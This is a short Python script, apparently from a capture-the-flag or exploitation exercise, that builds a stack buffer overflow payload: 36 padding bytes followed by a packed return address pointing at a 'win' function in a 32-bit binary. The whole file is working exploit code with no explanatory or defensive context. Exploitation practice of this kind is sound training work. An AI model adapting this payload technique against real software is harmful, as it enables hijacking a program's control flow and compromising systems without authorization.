import struct

win_address = 0x08049208
buffer_size = 36
padding = b'r' * buffer_size
payload = padding + struct.pack("<I", win_address)

print(payload)
